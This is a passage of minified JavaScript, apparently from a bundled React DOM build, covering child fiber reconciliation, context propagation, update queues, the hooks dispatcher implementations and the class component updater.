        C) : (C = fs(m.type, m.key, m.props, null, g.mode, C),
        C.ref = yo(g, p, m),
        C.return = g,
        C)
    }
    function c(g, p, m, C) {
        return p === null || p.tag !== 4 || p.stateNode.containerInfo !== m.containerInfo || p.stateNode.implementation !== m.implementation ? (p = ou(m, g.mode, C),
        p.return = g,
        p) : (p = a(p, m.children || []),
        p.return = g,
        p)
    }
    function f(g, p, m, C, k) {
        return p === null || p.tag !== 7 ? (p = Jr(m, g.mode, C, k),
        p.return = g,
        p) : (p = a(p, m),
        p.return = g,
        p)
    }
    function d(g, p, m) {
        if (typeof p == "string" && p !== "" || typeof p == "number")
            return p = au("" + p, g.mode, m),
            p.return = g,
            p;
        if (typeof p == "object" && p !== null) {
            switch (p.$$typeof) {
            case Ii:
                return m = fs(p.type, p.key, p.props, null, g.mode, m),
                m.ref = yo(g, null, p),
                m.return = g,
                m;
            case ba:
                return p = ou(p, g.mode, m),
                p.return = g,
                p;
            case fr:
                var C = p._init;
                return d(g, C(p._payload), m)
            }
            if (Eo(p) || fo(p))
                return p = Jr(p, g.mode, m, null),
                p.return = g,
                p;
            Ki(g, p)
        }
        return null
    }
    function h(g, p, m, C) {
        var k = p !== null ? p.key : null;
        if (typeof m == "string" && m !== "" || typeof m == "number")
            return k !== null ? null : s(g, p, "" + m, C);
        if (typeof m == "object" && m !== null) {
            switch (m.$$typeof) {
            case Ii:
                return m.key === k ? u(g, p, m, C) : null;
            case ba:
                return m.key === k ? c(g, p, m, C) : null;
            case fr:
                return k = m._init,
                h(g, p, k(m._payload), C)
            }
            if (Eo(m) || fo(m))
                return k !== null ? null : f(g, p, m, C, null);
            Ki(g, m)
        }
        return null
    }
    function N(g, p, m, C, k) {
        if (typeof C == "string" && C !== "" || typeof C == "number")
            return g = g.get(m) || null,
            s(p, g, "" + C, k);
        if (typeof C == "object" && C !== null) {
            switch (C.$$typeof) {
            case Ii:
                return g = g.get(C.key === null ? m : C.key) || null,
                u(p, g, C, k);
            case ba:
                return g = g.get(C.key === null ? m : C.key) || null,
                c(p, g, C, k);
            case fr:
                var w = C._init;
                return N(g, p, m, w(C._payload), k)
            }
            if (Eo(C) || fo(C))
                return g = g.get(m) || null,
                f(p, g, C, k, null);
            Ki(p, C)
        }
        return null
    }
    function y(g, p, m, C) {
        for (var k = null, w = null, A = p, P = p = 0, K = null; A !== null && P < m.length; P++) {
            A.index > P ? (K = A,
            A = null) : K = A.sibling;
            var $ = h(g, A, m[P], C);
            if ($ === null) {
                A === null && (A = K);
                break
            }
            e && A && $.alternate === null && t(g, A),
            p = o($, p, P),
            w === null ? k = $ : w.sibling = $,
            w = $,
            A = K
        }
        if (P === m.length)
            return n(g, A),
            pt && Ur(g, P),
            k;
        if (A === null) {
            for (; P < m.length; P++)
                A = d(g, m[P], C),
                A !== null && (p = o(A, p, P),
                w === null ? k = A : w.sibling = A,
                w = A);
            return pt && Ur(g, P),
            k
        }
        for (A = r(g, A); P < m.length; P++)
            K = N(A, g, P, m[P], C),
            K !== null && (e && K.alternate !== null && A.delete(K.key === null ? P : K.key),
            p = o(K, p, P),
            w === null ? k = K : w.sibling = K,
            w = K);
        return e && A.forEach(function(Se) {
            return t(g, Se)
        }),
        pt && Ur(g, P),
        k
    }
    function S(g, p, m, C) {
        var k = fo(m);
        if (typeof k != "function")
            throw Error(G(150));
        if (m = k.call(m),
        m == null)
            throw Error(G(151));
        for (var w = k = null, A = p, P = p = 0, K = null, $ = m.next(); A !== null && !$.done; P++,
        $ = m.next()) {
            A.index > P ? (K = A,
            A = null) : K = A.sibling;
            var Se = h(g, A, $.value, C);
            if (Se === null) {
                A === null && (A = K);
                break
            }
            e && A && Se.alternate === null && t(g, A),
            p = o(Se, p, P),
            w === null ? k = Se : w.sibling = Se,
            w = Se,
            A = K
        }
        if ($.done)
            return n(g, A),
            pt && Ur(g, P),
            k;
        if (A === null) {
            for (; !$.done; P++,
            $ = m.next())
                $ = d(g, $.value, C),
                $ !== null && (p = o($, p, P),
                w === null ? k = $ : w.sibling = $,
                w = $);
            return pt && Ur(g, P),
            k
        }
        for (A = r(g, A); !$.done; P++,
        $ = m.next())
            $ = N(A, g, P, $.value, C),
            $ !== null && (e && $.alternate !== null && A.delete($.key === null ? P : $.key),
            p = o($, p, P),
            w === null ? k = $ : w.sibling = $,
            w = $);
        return e && A.forEach(function(Te) {
            return t(g, Te)
        }),
        pt && Ur(g, P),
        k
    }
    function x(g, p, m, C) {
        if (typeof m == "object" && m !== null && m.type === Sa && m.key === null && (m = m.props.children),
        typeof m == "object" && m !== null) {
            switch (m.$$typeof) {
            case Ii:
                e: {
                    for (var k = m.key, w = p; w !== null; ) {
                        if (w.key === k) {
                            if (k = m.type,
                            k === Sa) {
                                if (w.tag === 7) {
                                    n(g, w.sibling),
                                    p = a(w, m.props.children),
                                    p.return = g,
                                    g = p;
                                    break e
                                }
                            } else if (w.elementType === k || typeof k == "object" && k !== null && k.$$typeof === fr && Qd(k) === w.type) {
                                n(g, w.sibling),
                                p = a(w, m.props),
                                p.ref = yo(g, w, m),
                                p.return = g,
                                g = p;
                                break e
                            }
                            n(g, w);
                            break
                        } else
                            t(g, w);
                        w = w.sibling
                    }
                    m.type === Sa ? (p = Jr(m.props.children, g.mode, C, m.key),
                    p.return = g,
                    g = p) : (C = fs(m.type, m.key, m.props, null, g.mode, C),
                    C.ref = yo(g, p, m),
                    C.return = g,
                    g = C)
                }
                return i(g);
            case ba:
                e: {
                    for (w = m.key; p !== null; ) {
                        if (p.key === w)
                            if (p.tag === 4 && p.stateNode.containerInfo === m.containerInfo && p.stateNode.implementation === m.implementation) {
                                n(g, p.sibling),
                                p = a(p, m.children || []),
                                p.return = g,
                                g = p;
                                break e
                            } else {
                                n(g, p);
                                break
                            }
                        else
                            t(g, p);
                        p = p.sibling
                    }
                    p = ou(m, g.mode, C),
                    p.return = g,
                    g = p
                }
                return i(g);
            case fr:
                return w = m._init,
                x(g, p, w(m._payload), C)
            }
            if (Eo(m))
                return y(g, p, m, C);
            if (fo(m))
                return S(g, p, m, C);
            Ki(g, m)
        }
        return typeof m == "string" && m !== "" || typeof m == "number" ? (m = "" + m,
        p !== null && p.tag === 6 ? (n(g, p.sibling),
        p = a(p, m),
        p.return = g,
        g = p) : (n(g, p),
        p = au(m, g.mode, C),
        p.return = g,
        g = p),
        i(g)) : n(g, p)
    }
    return x
}
var Wa = t0(!0)
  , n0 = t0(!1)
  , Os = Ar(null)
  , Rs = null
  , Pa = null
  , hf = null;
function mf() {
    hf = Pa = Rs = null
}
function gf(e) {
    var t = Os.current;
    st(Os),
    e._currentValue = t
}
function qu(e, t, n) {
    for (; e !== null; ) {
        var r = e.alternate;
        if ((e.childLanes & t) !== t ? (e.childLanes |= t,
        r !== null && (r.childLanes |= t)) : r !== null && (r.childLanes & t) !== t && (r.childLanes |= t),
        e === n)
            break;
        e = e.return
    }
}
function Fa(e, t) {
    Rs = e,
    hf = Pa = null,
    e = e.dependencies,
    e !== null && e.firstContext !== null && (e.lanes & t && (Qt = !0),
    e.firstContext = null)
}
function wn(e) {
    var t = e._currentValue;
    if (hf !== e)
        if (e = {
            context: e,
            memoizedValue: t,
            next: null
        },
        Pa === null) {
            if (Rs === null)
                throw Error(G(308));
            Pa = e,
            Rs.dependencies = {
                lanes: 0,
                firstContext: e
            }
        } else
            Pa = Pa.next = e;
    return t
}
var Kr = null;
function yf(e) {
    Kr === null ? Kr = [e] : Kr.push(e)
}
function r0(e, t, n, r) {
    var a = t.interleaved;
    return a === null ? (n.next = n,
    yf(t)) : (n.next = a.next,
    a.next = n),
    t.interleaved = n,
    Xn(e, r)
}
function Xn(e, t) {
    e.lanes |= t;
    var n = e.alternate;
    for (n !== null && (n.lanes |= t),
    n = e,
    e = e.return; e !== null; )
        e.childLanes |= t,
        n = e.alternate,
        n !== null && (n.childLanes |= t),
        n = e,
        e = e.return;
    return n.tag === 3 ? n.stateNode : null
}
var dr = !1;
function vf(e) {
    e.updateQueue = {
        baseState: e.memoizedState,
        firstBaseUpdate: null,
        lastBaseUpdate: null,
        shared: {
            pending: null,
            interleaved: null,
            lanes: 0
        },
        effects: null
    }
}
function a0(e, t) {
    e = e.updateQueue,
    t.updateQueue === e && (t.updateQueue = {
        baseState: e.baseState,
        firstBaseUpdate: e.firstBaseUpdate,
        lastBaseUpdate: e.lastBaseUpdate,
        shared: e.shared,
        effects: e.effects
    })
}
function Kn(e, t) {
    return {
        eventTime: e,
        lane: t,
        tag: 0,
        payload: null,
        callback: null,
        next: null
    }
}
function Nr(e, t, n) {
    var r = e.updateQueue;
    if (r === null)
        return null;
    if (r = r.shared,
    Ge & 2) {
        var a = r.pending;
        return a === null ? t.next = t : (t.next = a.next,
        a.next = t),
        r.pending = t,
        Xn(e, n)
    }
    return a = r.interleaved,
    a === null ? (t.next = t,
    yf(r)) : (t.next = a.next,
    a.next = t),
    r.interleaved = t,
    Xn(e, n)
}
function os(e, t, n) {
    if (t = t.updateQueue,
    t !== null && (t = t.shared,
    (n & 4194240) !== 0)) {
        var r = t.lanes;
        r &= e.pendingLanes,
        n |= r,
        t.lanes = n,
        nf(e, n)
    }
}
function Xd(e, t) {
    var n = e.updateQueue
      , r = e.alternate;
    if (r !== null && (r = r.updateQueue,
    n === r)) {
        var a = null
          , o = null;
        if (n = n.firstBaseUpdate,
        n !== null) {
            do {
                var i = {
                    eventTime: n.eventTime,
                    lane: n.lane,
                    tag: n.tag,
                    payload: n.payload,
                    callback: n.callback,
                    next: null
                };
                o === null ? a = o = i : o = o.next = i,
                n = n.next
            } while (n !== null);
            o === null ? a = o = t : o = o.next = t
        } else
            a = o = t;
        n = {
            baseState: r.baseState,
            firstBaseUpdate: a,
            lastBaseUpdate: o,
            shared: r.shared,
            effects: r.effects
        },
        e.updateQueue = n;
        return
    }
    e = n.lastBaseUpdate,
    e === null ? n.firstBaseUpdate = t : e.next = t,
    n.lastBaseUpdate = t
}
function As(e, t, n, r) {
    var a = e.updateQueue;
    dr = !1;
    var o = a.firstBaseUpdate
      , i = a.lastBaseUpdate
      , s = a.shared.pending;
    if (s !== null) {
        a.shared.pending = null;
        var u = s
          , c = u.next;
        u.next = null,
        i === null ? o = c : i.next = c,
        i = u;
        var f = e.alternate;
        f !== null && (f = f.updateQueue,
        s = f.lastBaseUpdate,
        s !== i && (s === null ? f.firstBaseUpdate = c : s.next = c,
        f.lastBaseUpdate = u))
    }
    if (o !== null) {
        var d = a.baseState;
        i = 0,
        f = c = u = null,
        s = o;
        do {
            var h = s.lane
              , N = s.eventTime;
            if ((r & h) === h) {
                f !== null && (f = f.next = {
                    eventTime: N,
                    lane: 0,
                    tag: s.tag,
                    payload: s.payload,
                    callback: s.callback,
                    next: null
                });
                e: {
                    var y = e
                      , S = s;
                    switch (h = t,
                    N = n,
                    S.tag) {
                    case 1:
                        if (y = S.payload,
                        typeof y == "function") {
                            d = y.call(N, d, h);
                            break e
                        }
                        d = y;
                        break e;
                    case 3:
                        y.flags = y.flags & -65537 | 128;
                    case 0:
                        if (y = S.payload,
                        h = typeof y == "function" ? y.call(N, d, h) : y,
                        h == null)
                            break e;
                        d = xt({}, d, h);
                        break e;
                    case 2:
                        dr = !0
                    }
                }
                s.callback !== null && s.lane !== 0 && (e.flags |= 64,
                h = a.effects,
                h === null ? a.effects = [s] : h.push(s))
            } else
                N = {
                    eventTime: N,
                    lane: h,
                    tag: s.tag,
                    payload: s.payload,
                    callback: s.callback,
                    next: null
                },
                f === null ? (c = f = N,
                u = d) : f = f.next = N,
                i |= h;
            if (s = s.next,
            s === null) {
                if (s = a.shared.pending,
                s === null)
                    break;
                h = s,
                s = h.next,
                h.next = null,
                a.lastBaseUpdate = h,
                a.shared.pending = null
            }
        } while (!0);
        if (f === null && (u = d),
        a.baseState = u,
        a.firstBaseUpdate = c,
        a.lastBaseUpdate = f,
        t = a.shared.interleaved,
        t !== null) {
            a = t;
            do
                i |= a.lane,
                a = a.next;
            while (a !== t)
        } else
            o === null && (a.shared.lanes = 0);
        oa |= i,
        e.lanes = i,
        e.memoizedState = d
    }
}
function qd(e, t, n) {
    if (e = t.effects,
    t.effects = null,
    e !== null)
        for (t = 0; t < e.length; t++) {
            var r = e[t]
              , a = r.callback;
            if (a !== null) {
                if (r.callback = null,
                r = n,
                typeof a != "function")
                    throw Error(G(191, a));
                a.call(r)
            }
        }
}
var xi = {}
  , zn = Ar(xi)
  , ni = Ar(xi)
  , ri = Ar(xi);
function Gr(e) {
    if (e === xi)
        throw Error(G(174));
    return e
}
function xf(e, t) {
    switch (rt(ri, t),
    rt(ni, e),
    rt(zn, xi),
    e = t.nodeType,
    e) {
    case 9:
    case 11:
        t = (t = t.documentElement) ? t.namespaceURI : Ou(null, "");
        break;
    default:
        e = e === 8 ? t.parentNode : t,
        t = e.namespaceURI || null,
        e = e.tagName,
        t = Ou(t, e)
    }
    st(zn),
    rt(zn, t)
}
function Ka() {
    st(zn),
    st(ni),
    st(ri)
}
function o0(e) {
    Gr(ri.current);
    var t = Gr(zn.current)
      , n = Ou(t, e.type);
    t !== n && (rt(ni, e),
    rt(zn, n))
}
function wf(e) {
    ni.current === e && (st(zn),
    st(ni))
}
var yt = Ar(0);
function Ls(e) {
    for (var t = e; t !== null; ) {
        if (t.tag === 13) {
            var n = t.memoizedState;
            if (n !== null && (n = n.dehydrated,
            n === null || n.data === "$?" || n.data === "$!"))
                return t
        } else if (t.tag === 19 && t.memoizedProps.revealOrder !== void 0) {
            if (t.flags & 128)
                return t
        } else if (t.child !== null) {
            t.child.return = t,
            t = t.child;
            continue
        }
        if (t === e)
            break;
        for (; t.sibling === null; ) {
            if (t.return === null || t.return === e)
                return null;
            t = t.return
        }
        t.sibling.return = t.return,
        t = t.sibling
    }
    return null
}
var Jl = [];
function bf() {
    for (var e = 0; e < Jl.length; e++)
        Jl[e]._workInProgressVersionPrimary = null;
    Jl.length = 0
}
var is = er.ReactCurrentDispatcher
  , Zl = er.ReactCurrentBatchConfig
  , aa = 0
  , vt = null
  , _t = null
  , Rt = null
  , Is = !1
  , zo = !1
  , ai = 0
  , Rv = 0;
function zt() {
    throw Error(G(321))
}
function Sf(e, t) {
    if (t === null)
        return !1;
    for (var n = 0; n < t.length && n < e.length; n++)
        if (!Tn(e[n], t[n]))
            return !1;
    return !0
}
function Nf(e, t, n, r, a, o) {
    if (aa = o,
    vt = t,
    t.memoizedState = null,
    t.updateQueue = null,
    t.lanes = 0,
    is.current = e === null || e.memoizedState === null ? Mv : Dv,
    e = n(r, a),
    zo) {
        o = 0;
        do {
            if (zo = !1,
            ai = 0,
            25 <= o)
                throw Error(G(301));
            o += 1,
            Rt = _t = null,
            t.updateQueue = null,
            is.current = zv,
            e = n(r, a)
        } while (zo)
    }
    if (is.current = Ms,
    t = _t !== null && _t.next !== null,
    aa = 0,
    Rt = _t = vt = null,
    Is = !1,
    t)
        throw Error(G(300));
    return e
}
function Cf() {
    var e = ai !== 0;
    return ai = 0,
    e
}
function Rn() {
    var e = {
        memoizedState: null,
        baseState: null,
        baseQueue: null,
        queue: null,
        next: null
    };
    return Rt === null ? vt.memoizedState = Rt = e : Rt = Rt.next = e,
    Rt
}
function bn() {
    if (_t === null) {
        var e = vt.alternate;
        e = e !== null ? e.memoizedState : null
    } else
        e = _t.next;
    var t = Rt === null ? vt.memoizedState : Rt.next;
    if (t !== null)
        Rt = t,
        _t = e;
    else {
        if (e === null)
            throw Error(G(310));
        _t = e,
        e = {
            memoizedState: _t.memoizedState,
            baseState: _t.baseState,
            baseQueue: _t.baseQueue,
            queue: _t.queue,
            next: null
        },
        Rt === null ? vt.memoizedState = Rt = e : Rt = Rt.next = e
    }
    return Rt
}
function oi(e, t) {
    return typeof t == "function" ? t(e) : t
}
function eu(e) {
    var t = bn()
      , n = t.queue;
    if (n === null)
        throw Error(G(311));
    n.lastRenderedReducer = e;
    var r = _t
      , a = r.baseQueue
      , o = n.pending;
    if (o !== null) {
        if (a !== null) {
            var i = a.next;
            a.next = o.next,
            o.next = i
        }
        r.baseQueue = a = o,
        n.pending = null
    }
    if (a !== null) {
        o = a.next,
        r = r.baseState;
        var s = i = null
          , u = null
          , c = o;
        do {
            var f = c.lane;
            if ((aa & f) === f)
                u !== null && (u = u.next = {
                    lane: 0,
                    action: c.action,
                    hasEagerState: c.hasEagerState,
                    eagerState: c.eagerState,
                    next: null
                }),
                r = c.hasEagerState ? c.eagerState : e(r, c.action);
            else {
                var d = {
                    lane: f,
                    action: c.action,
                    hasEagerState: c.hasEagerState,
                    eagerState: c.eagerState,
                    next: null
                };
                u === null ? (s = u = d,
                i = r) : u = u.next = d,
                vt.lanes |= f,
                oa |= f
            }
            c = c.next
        } while (c !== null && c !== o);
        u === null ? i = r : u.next = s,
        Tn(r, t.memoizedState) || (Qt = !0),
        t.memoizedState = r,
        t.baseState = i,
        t.baseQueue = u,
        n.lastRenderedState = r
    }
    if (e = n.interleaved,
    e !== null) {
        a = e;
        do
            o = a.lane,
            vt.lanes |= o,
            oa |= o,
            a = a.next;
        while (a !== e)
    } else
        a === null && (n.lanes = 0);
    return [t.memoizedState, n.dispatch]
}
function tu(e) {
    var t = bn()
      , n = t.queue;
    if (n === null)
        throw Error(G(311));
    n.lastRenderedReducer = e;
    var r = n.dispatch
      , a = n.pending
      , o = t.memoizedState;
    if (a !== null) {
        n.pending = null;
        var i = a = a.next;
        do
            o = e(o, i.action),
            i = i.next;
        while (i !== a);
        Tn(o, t.memoizedState) || (Qt = !0),
        t.memoizedState = o,
        t.baseQueue === null && (t.baseState = o),
        n.lastRenderedState = o
    }
    return [o, r]
}
function i0() {}
function s0(e, t) {
    var n = vt
      , r = bn()
      , a = t()
      , o = !Tn(r.memoizedState, a);
    if (o && (r.memoizedState = a,
    Qt = !0),
    r = r.queue,
    kf(c0.bind(null, n, r, e), [e]),
    r.getSnapshot !== t || o || Rt !== null && Rt.memoizedState.tag & 1) {
        if (n.flags |= 2048,
        ii(9, u0.bind(null, n, r, a, t), void 0, null),
        At === null)
            throw Error(G(349));
        aa & 30 || l0(n, t, a)
    }
    return a
}
function l0(e, t, n) {
    e.flags |= 16384,
    e = {
        getSnapshot: t,
        value: n
    },
    t = vt.updateQueue,
    t === null ? (t = {
        lastEffect: null,
        stores: null
    },
    vt.updateQueue = t,
    t.stores = [e]) : (n = t.stores,
    n === null ? t.stores = [e] : n.push(e))
}
function u0(e, t, n, r) {
    t.value = n,
    t.getSnapshot = r,
    f0(t) && d0(e)
}
function c0(e, t, n) {
    return n(function() {
        f0(t) && d0(e)
    })
}
function f0(e) {
    var t = e.getSnapshot;
    e = e.value;
    try {
        var n = t();
        return !Tn(e, n)
    } catch {
        return !0
    }
}
function d0(e) {
    var t = Xn(e, 1);
    t !== null && _n(t, e, 1, -1)
}
function Jd(e) {
    var t = Rn();
    return typeof e == "function" && (e = e()),
    t.memoizedState = t.baseState = e,
    e = {
        pending: null,
        interleaved: null,
        lanes: 0,
        dispatch: null,
        lastRenderedReducer: oi,
        lastRenderedState: e
    },
    t.queue = e,
    e = e.dispatch = Iv.bind(null, vt, e),
    [t.memoizedState, e]
}
function ii(e, t, n, r) {
    return e = {
        tag: e,
        create: t,
        destroy: n,
        deps: r,
        next: null
    },
    t = vt.updateQueue,
    t === null ? (t = {
        lastEffect: null,
        stores: null
    },
    vt.updateQueue = t,
    t.lastEffect = e.next = e) : (n = t.lastEffect,
    n === null ? t.lastEffect = e.next = e : (r = n.next,
    n.next = e,
    e.next = r,
    t.lastEffect = e)),
    e
}
function p0() {
    return bn().memoizedState
}
function ss(e, t, n, r) {
    var a = Rn();
    vt.flags |= e,
    a.memoizedState = ii(1 | t, n, void 0, r === void 0 ? null : r)
}
function ul(e, t, n, r) {
    var a = bn();
    r = r === void 0 ? null : r;
    var o = void 0;
    if (_t !== null) {
        var i = _t.memoizedState;
        if (o = i.destroy,
        r !== null && Sf(r, i.deps)) {
            a.memoizedState = ii(t, n, o, r);
            return
        }
    }
    vt.flags |= e,
    a.memoizedState = ii(1 | t, n, o, r)
}
function Zd(e, t) {
    return ss(8390656, 8, e, t)
}
function kf(e, t) {
    return ul(2048, 8, e, t)
}
function h0(e, t) {
    return ul(4, 2, e, t)
}
function m0(e, t) {
    return ul(4, 4, e, t)
}
function g0(e, t) {
    if (typeof t == "function")
        return e = e(),
        t(e),
        function() {
            t(null)
        }
        ;
    if (t != null)
        return e = e(),
        t.current = e,
        function() {
            t.current = null
        }
}
function y0(e, t, n) {
    return n = n != null ? n.concat([e]) : null,
    ul(4, 4, g0.bind(null, t, e), n)
}
function jf() {}
function v0(e, t) {
    var n = bn();
    t = t === void 0 ? null : t;
    var r = n.memoizedState;
    return r !== null && t !== null && Sf(t, r[1]) ? r[0] : (n.memoizedState = [e, t],
    e)
}
function x0(e, t) {
    var n = bn();
    t = t === void 0 ? null : t;
    var r = n.memoizedState;
    return r !== null && t !== null && Sf(t, r[1]) ? r[0] : (e = e(),
    n.memoizedState = [e, t],
    e)
}
function w0(e, t, n) {
    return aa & 21 ? (Tn(n, t) || (n = km(),
    vt.lanes |= n,
    oa |= n,
    e.baseState = !0),
    t) : (e.baseState && (e.baseState = !1,
    Qt = !0),
    e.memoizedState = n)
}
function Av(e, t) {
    var n = Je;
    Je = n !== 0 && 4 > n ? n : 4,
    e(!0);
    var r = Zl.transition;
    Zl.transition = {};
    try {
        e(!1),
        t()
    } finally {
        Je = n,
        Zl.transition = r
    }
}
function b0() {
    return bn().memoizedState
}
function Lv(e, t, n) {
    var r = kr(e);
    if (n = {
        lane: r,
        action: n,
        hasEagerState: !1,
        eagerState: null,
        next: null
    },
    S0(e))
        N0(t, n);
    else if (n = r0(e, t, n, r),
    n !== null) {
        var a = Ht();
        _n(n, e, r, a),
        C0(n, t, r)
    }
}
function Iv(e, t, n) {
    var r = kr(e)
      , a = {
        lane: r,
        action: n,
        hasEagerState: !1,
        eagerState: null,
        next: null
    };
    if (S0(e))
        N0(t, a);
    else {
        var o = e.alternate;
        if (e.lanes === 0 && (o === null || o.lanes === 0) && (o = t.lastRenderedReducer,
        o !== null))
            try {
                var i = t.lastRenderedState
                  , s = o(i, n);
                if (a.hasEagerState = !0,
                a.eagerState = s,
                Tn(s, i)) {
                    var u = t.interleaved;
                    u === null ? (a.next = a,
                    yf(t)) : (a.next = u.next,
                    u.next = a),
                    t.interleaved = a;
                    return
                }
            } catch {} finally {}
        n = r0(e, t, a, r),
        n !== null && (a = Ht(),
        _n(n, e, r, a),
        C0(n, t, r))
    }
}
function S0(e) {
    var t = e.alternate;
    return e === vt || t !== null && t === vt
}
function N0(e, t) {
    zo = Is = !0;
    var n = e.pending;
    n === null ? t.next = t : (t.next = n.next,
    n.next = t),
    e.pending = t
}
function C0(e, t, n) {
    if (n & 4194240) {
        var r = t.lanes;
        r &= e.pendingLanes,
        n |= r,
        t.lanes = n,
        nf(e, n)
    }
}
var Ms = {
    readContext: wn,
    useCallback: zt,
    useContext: zt,
    useEffect: zt,
    useImperativeHandle: zt,
    useInsertionEffect: zt,
    useLayoutEffect: zt,
    useMemo: zt,
    useReducer: zt,
    useRef: zt,
    useState: zt,
    useDebugValue: zt,
    useDeferredValue: zt,
    useTransition: zt,
    useMutableSource: zt,
    useSyncExternalStore: zt,
    useId: zt,
    unstable_isNewReconciler: !1
}
  , Mv = {
    readContext: wn,
    useCallback: function(e, t) {
        return Rn().memoizedState = [e, t === void 0 ? null : t],
        e
    },
    useContext: wn,
    useEffect: Zd,
    useImperativeHandle: function(e, t, n) {
        return n = n != null ? n.concat([e]) : null,
        ss(4194308, 4, g0.bind(null, t, e), n)
    },
    useLayoutEffect: function(e, t) {
        return ss(4194308, 4, e, t)
    },
    useInsertionEffect: function(e, t) {
        return ss(4, 2, e, t)
    },
    useMemo: function(e, t) {
        var n = Rn();
        return t = t === void 0 ? null : t,
        e = e(),
        n.memoizedState = [e, t],
        e
    },
    useReducer: function(e, t, n) {
        var r = Rn();
        return t = n !== void 0 ? n(t) : t,
        r.memoizedState = r.baseState = t,
        e = {
            pending: null,
            interleaved: null,
            lanes: 0,
            dispatch: null,
            lastRenderedReducer: e,
            lastRenderedState: t
        },
        r.queue = e,
        e = e.dispatch = Lv.bind(null, vt, e),
        [r.memoizedState, e]
    },
    useRef: function(e) {
        var t = Rn();
        return e = {
            current: e
        },
        t.memoizedState = e
    },
    useState: Jd,
    useDebugValue: jf,
    useDeferredValue: function(e) {
        return Rn().memoizedState = e
    },
    useTransition: function() {
        var e = Jd(!1)
          , t = e[0];
        return e = Av.bind(null, e[1]),
        Rn().memoizedState = e,
        [t, e]
    },
    useMutableSource: function() {},
    useSyncExternalStore: function(e, t, n) {
        var r = vt
          , a = Rn();
        if (pt) {
            if (n === void 0)
                throw Error(G(407));
            n = n()
        } else {
            if (n = t(),
            At === null)
                throw Error(G(349));
            aa & 30 || l0(r, t, n)
        }
        a.memoizedState = n;
        var o = {
            value: n,
            getSnapshot: t
        };
        return a.queue = o,
        Zd(c0.bind(null, r, o, e), [e]),
        r.flags |= 2048,
        ii(9, u0.bind(null, r, o, n, t), void 0, null),
        n
    },
    useId: function() {
        var e = Rn()
          , t = At.identifierPrefix;
        if (pt) {
            var n = Wn
              , r = Vn;
            n = (r & ~(1 << 32 - En(r) - 1)).toString(32) + n,
            t = ":" + t + "R" + n,
            n = ai++,
            0 < n && (t += "H" + n.toString(32)),
            t += ":"
        } else
            n = Rv++,
            t = ":" + t + "r" + n.toString(32) + ":";
        return e.memoizedState = t
    },
    unstable_isNewReconciler: !1
}
  , Dv = {
    readContext: wn,
    useCallback: v0,
    useContext: wn,
    useEffect: kf,
    useImperativeHandle: y0,
    useInsertionEffect: h0,
    useLayoutEffect: m0,
    useMemo: x0,
    useReducer: eu,
    useRef: p0,
    useState: function() {
        return eu(oi)
    },
    useDebugValue: jf,
    useDeferredValue: function(e) {
        var t = bn();
        return w0(t, _t.memoizedState, e)
    },
    useTransition: function() {
        var e = eu(oi)[0]
          , t = bn().memoizedState;
        return [e, t]
    },
    useMutableSource: i0,
    useSyncExternalStore: s0,
    useId: b0,
    unstable_isNewReconciler: !1
}
  , zv = {
    readContext: wn,
    useCallback: v0,
    useContext: wn,
    useEffect: kf,
    useImperativeHandle: y0,
    useInsertionEffect: h0,
    useLayoutEffect: m0,
    useMemo: x0,
    useReducer: tu,
    useRef: p0,
    useState: function() {
        return tu(oi)
    },
    useDebugValue: jf,
    useDeferredValue: function(e) {
        var t = bn();
        return _t === null ? t.memoizedState = e : w0(t, _t.memoizedState, e)
    },
    useTransition: function() {
        var e = tu(oi)[0]
          , t = bn().memoizedState;
        return [e, t]
    },
    useMutableSource: i0,
    useSyncExternalStore: s0,
    useId: b0,
    unstable_isNewReconciler: !1
};
function Nn(e, t) {
    if (e && e.defaultProps) {
        t = xt({}, t),
        e = e.defaultProps;
        for (var n in e)
            t[n] === void 0 && (t[n] = e[n]);
        return t
    }
    return t
}
function Ju(e, t, n, r) {
    t = e.memoizedState,
    n = n(r, t),
    n = n == null ? t : xt({}, t, n),
    e.memoizedState = n,
    e.lanes === 0 && (e.updateQueue.baseState = n)
}
var cl = {
    isMounted: function(e) {
        return (e = e._reactInternals) ? pa(e) === e : !1
    },
    enqueueSetState: function(e, t, n) {
        e = e._reactInternals;
        var r = Ht()
          , a = kr(e)
          , o = Kn(r, a);
        o.payload = t,
        n != null && (o.callback = n),
        t = Nr(e, o, a),
        t !== null && (_n(t, e, a, r),
        os(t, e, a))
    },
    enqueueReplaceState: function(e, t, n) {
        e = e._reactInternals;
        var r = Ht()
          , a = kr(e)
          , o = Kn(r, a);
        o.tag = 1,
        o.payload = t,
        n != null && (o.callback = n),
        t = Nr(e, o, a),
        t !== null && (_n(t, e, a, r),
        os(t, e, a))
    },
    enqueueForceUpdate: function(e, t) {
        e = e._reactInternals;
        var n = Ht()
          , r = kr(e)
          , a = Kn(n, r);
        a.tag = 2,
        t != null && (a.callback = t),
        t = Nr(e, a, r),
        t !== null && (_n(t, e, r, n),
        os(t, e, r))
    }
};
function ep(e, t, n, r, a, o, i) {
    return e = e.stateNode,
    typeof e.shouldComponentUpdate == "function" ? e.shouldComponentUpdate(r, o, i) : t.prototype && t.prototype.isPureReactComponent ? !Jo(n, r) || !Jo(a, o) : !0
}
function k0(e, t, n) {
    var r = !1
      , a = _r
      , o = t.contextType;
    return typeof o == "object" && o !== null ? o = wn(o) : (a = qt(t) ? na : Bt.current,
    r = t.contextTypes,
    o = (r = r != null) ? Ha(e, a) : _r),
    t = new t(n,o),
    e.memoizedState = t.state !== null && t.state !== void 0 ? t.state : null,
    t.updater = cl,
    e.stateNode = t,
    t._reactInternals = e,
    r && (e = e.stateNode,
    e.__reactInternalMemoizedUnmaskedChildContext = a,
    e.__reactInternalMemoizedMaskedChildContext = o),
    t
}
function tp(e, t, n, r) {
    e = t.state,
    typeof t.componentWillReceiveProps == "function" && t.componentWillReceiveProps(n, r),
    typeof t.UNSAFE_componentWillReceiveProps == "function" && t.UNSAFE_componentWillReceiveProps(n, r),
    t.state !== e && cl.enqueueReplaceState(t, t.state, null)
}
function Zu(e, t, n, r) {
    var a = e.stateNode;
    a.props = n,
    a.state = e.memoizedState,
    a.refs = {},
    vf(e);
    var o = t.contextType;
    typeof o == "object" && o !== null ? a.context = wn(o) : (o = qt(t) ? na : Bt.current,
    a.context = Ha(e, o)),
    a.state = e.memoizedState,
    o = t.getDerivedStateFromProps,
    typeof o == "function" && (Ju(e, t, o, n),
    a.state = e.memoizedState),
    typeof t.getDerivedStateFromProps == "function" || typeof a.getSnapshotBeforeUpdate == "function" || typeof a.UNSAFE_componentWillMount != "function" && typeof a.componentWillMount != "function" || (t = a.state,
